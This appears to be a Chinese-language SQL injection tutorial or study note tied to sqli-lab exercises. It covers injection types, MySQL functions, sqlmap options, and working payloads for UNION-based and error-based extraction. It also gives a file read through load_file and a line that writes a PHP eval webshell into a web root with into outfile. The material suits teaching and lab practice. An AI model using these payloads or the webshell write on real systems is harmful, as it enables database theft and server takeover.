- 简介

结构化查询语言(Structured Query Language,缩写：SQL)，是一种特殊的编程语言，用于数据库中的标准数据查询语言。1986年10月，美国国家标准学会对SQL进行规范后，以此作为关系式数据库管理系统的标准语言(ANSI X3. 135-1986),1987年得到国际标准组织的支持下成为国际标准。不过各种通行的数据库系统在其实践过程中都对SQL规范作了某些编改和扩充。所以，实际上不同数据库系统之间不能完全相互通用。

MYSQL ACCESS MSSQL oracle

明显的层次结构
  库名|表名|字段名

# SQL注入(SQL Injection)

是一种常见的Web安全漏洞，攻击者利用这个漏洞，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。

## SQL注入基础

- 漏洞原理

针对SQL注入的攻击行为可描述为通过用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：
1. 程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句
2. 未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中。

- 注入点可能存在的位置

根据SQL注入漏洞的原理，在用户“可控参数”中注入SQL语法，也就是说Web应用在获取用户数据的地方，只要带入数据库查询，都有存在SQL注入的可能，这些地方通常包括：
 @ GET数据
 @ POST数据
 @ HTTP头部(HTTP请求报文其他字段)
 @ Cookie数据
 ...

   GPC （GET POST Cookie）

- 漏洞危害

攻击者利用SQL注入漏洞，可以获取数据库中的多种信息（例如：管理员后台密码），从而脱取数据库中内容（脱库）。在特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限。
  mysql提权 mof|udf

- 分类

SQL注入漏洞根据不同的标准，有不同的分类。但是从数据类型分类来看，SQL注入分为数字型和字符型。

数字型注入就是说注入点的数据，拼接到SQL语句中是以数字型出现的，即数据两边没有被单引号、双引号包括。
字符型注入正好相反

根据注入手法分类，大致可分为以下几个类别。
@ UNION query SQL injection (可联合查询注入)         联合查询
@ Error-based SQL injection (报错型注入)             报错注入
@ Boolean-based blind SQL injection (布尔型注入)     布尔盲注
@ Time-based blind SQL injection (基于时间延迟注入)   延时注入
@ Stacked queries SQL injection (可多语句查询注入)    堆叠查询

- 注入点的判断
 我们会在疑似注入点的连接或参数后面尝试提交以下数据

测试数据和方法不仅限于以下几种，并且还有多种变化。这些语句和变化需要在实战

# MYSQL相关

@ 注释
#
-- （--空格）
/* .... */
/* !... */ 内联查询

@ mysql元数据库information_schema
    tables
      table_name    表名
      table_schema  表所属数据库
    columns
      column_name   字段名
      table_name    字段所属表名
      table_schema  字段所属库名

@ MYSQL常用函数与参数

=|>|<|>=|<=|<>     比较运算符
and|or             逻辑运算符
version()          mysql数据库版本
database()         当前数据库名
user()             用户名
current_user()     当前用户名
system_user()      系统用户名
@@datadir          数据库路径
@@version_compile_os  操作系统版本

length()           返回字符串的长度
substring()        截取字符串
substr()
mid()
                   1. 截取的字符串
                   2. 截取起始位置，从1开始计数
                   3. 截取长度

left()             从左侧开始取指定字符个数的字符串
concat()           没有分隔符的连接字符串
concat_ws()        含有分隔符的连接字符串
group_concat()     连接一个组的字符串

ord()              返回ASCLL码
ascii()            
hex()              将字符串转换为十六进制
unhex()            hex的反向操作
md5()              返回md5值
floor(x)           返回不大于x的最大整数
round()            返回参数x接近的整数
rand()             返回0-1之间的随机浮点数

load_file()        读取文件，并返回文件内容作为一个字符串

sleep()            睡眠时间为指定的秒数
if(true,t,f)       if 判断
find_in_set()      返回字符串在字符串列表中的位置
benchmark()        指定语句执行的次数
name_const()       返回表作为结果

@ 逻辑运算
在SQL语句中逻辑运算与(and)比或(or)的优先级高
[select 1=2 and 1=2 or 1=1;]

- 注入流程

由于关系型数据库系统，具有明显的库/表/列/内容结构层次，所以我们通过SQL注入漏洞获取数据库中信息时候，也依据这样的顺序。

首先获取数据库名，其次获取表名，然后获取列名，最后获取数据。

工具：御剑（扫描后台）

## SQL注入点的判断

?id=35  +1/-1
  select * from tbName where id={$id}
?id=35' 字符型还是数字型
near ''' at line 1
select * from tbName where id=35 and 1=1

?id=35 and 1=1                     是否有布尔类型的状态
?id=35 and 1=2
select * from tbName where id=35 and 1=1
select * from tbName where id=35 and 1=2

?id=35 and sleep(5)                是否有延时

### 联合查询

由于数据库中的内容会回显到页面中来，所以我们可以采用联合查询进行注入

联合查询就是SQL语法中的union select 语句。该语句会同时执行两条select语句，生成两张虚拟表，然后把查询到的结果进行拼接。

select ~~~ union select ~~~

由于虚拟表是二维结构，联合查询会“纵向”拼接两张虚拟的表

实现跨库跨表查询

- 必要条件

@ 两张虚拟的表具有相同的列数
@ 虚拟表对应的列的数据类型相同

- 判断字段个数

可以使用[order by]语句来判断当前select语句所查询的虚拟表的列数。

[order by]语句本意是按照某一列进行排序，在mysql中可以使用数字来代替具体的列名，比如[order by 1]就是按照第一列进行排序，如果mysql没有找到对应的列，就会报错[Unknown column]，我们可以依次增加数字，直到数据库报错

[order by 1 --+]
[order by 2 --+]
...
[order by 15 --+]

## 判断显示位置
  
  得到字段个数之后，可以尝试构造联合查询语句
  
  这里我们并不知道表名，根据mysql数据库特性，select语句在执行的过程中，并不需要直到表名。
  [?id=33 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+]
  [?id=33 union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null --+]

  页面显示的是第一张虚拟表的内容，那么我们可以考虑让第一张虚拟表的查询条件为假，则显示第二条记录。因此构造SQL语句：
  [?id=33 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+]
  [?id=-33 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+]

  在执行SQL语句注入时，可以考虑火狐浏览器的hackbar
  burp suite

  十六进制解码

  ## 报错注入

  在注入点的判断过程中，发现数据库中SQL语句的报错信息，会显示在页面中，因此可以进行报错注入。

  报错注入的原理，就是在错误信息中执行SQL语句。触发报错的方式很多，具体细节也不尽相同

  - group by 重复键冲突

  [?id=33 and (select 1 from (select count(*),concat((select version() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+]

  - XPATH 报错

  @ extractvalue()
  [?id=33 and extractvalue(1,concat('^',(select version()),'^')) --+]

  @ updatexml()
  [?id=33 and updatexml(1,concat('^',(select datebase()),'^'),1) --+]

```
 口诀
 是否有回显    联合查询
 是否有报错    报错注入
 是否有布尔类型状态  布尔盲注
 绝招          延时注入
```

# sqlmap 

-u url   检测注入点
--dbs    列出所有数据库的名字
--current-db   列出当前数据库的名字
-D       指定一个数据库
--tables  列出表名
-T       指定表名
--columns  列出所有的字段名
-C       指定字段
--dump   列出字段内容

post注入

# 读写文件

- 前提条件
 我们可以利用SQL注入漏洞读写文件。但是读写文件需要一定的条件
 1. secure-file-priv
 可以在phpmyadmin中看到该变量

 该参数在高版本的mysql数据库中限制了文件的导入导出操作。改参数可以写在my.ini配置文件中[mysqld]下。若要配置此参数，需要修改my.ini配置文件，并重启mysql服务。

 关于该参数的相关说明
 secure-file-priv 参数配置         含义
 secure-file-priv=                不对mysqld的导入导出操作做限制
 secure-file-priv='c:/a/'         限制mysqld的导入导出操作发生在c:/a/下(子目录有效)
 secure-file-priv=null            限制mysqld不允许导入导出操作

 2. 当前用户具有文件权限
 查询语句[select File_priv from mysql.user where user="root" and host="localhost"]。

 3. 直到写入目标文件的绝对路径

 - 读取文件操作
 [?id=-1' union select 1,load_file('C:\\Windows\\System32\\drivers\\etc\\hosts'),3 --+]
 load_file()

 - 写入文件操作
 [?id=1' and 1=2 union select 1,'<?php @eval($_REQUEST[777]);?>',3 into outfile 'c:\\phpstudy\\www\\2.php' --+],直接传入参数，页面如果不报错，说明写入成功。可以直接访问写入的文件[http://localhost/1.php]
  into outfile

### 宽字节注入

宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。
sqli-lab 32
GBK编码范围 8140-FEFE（16进制）

转义字符[\]的编码是5C，正好是GBK编码范围之内，也就是说我们可以在单引号之前提交一个十六进制编码的字符，与5C组成一个GBK编码的汉字。这样SQL语句传入数据库的时候，转义字符5C，会被当作GBK汉字的低位字节编码，从而失去转义的作用。

0Xdf5c  就是一个汉字

### Cookie注入

sqli-lab 20

Cookie注入的注入参数需要通过Cookie提交，可以通过[document.cookie]在控制台完成对浏览器Cookie的读写。

### base64 注入

sqli-lab 22

base64 注入是比较简单的，只不过将注入字段经过base64编码。

### HTTP头部注入

User-Agent注入
sqli-lab 18

HTTP头部注入就是指注入字段在HTTP头部的字段中，这些字段通常有User-Agent、Referer等

Referer注入
sqli-lab 19

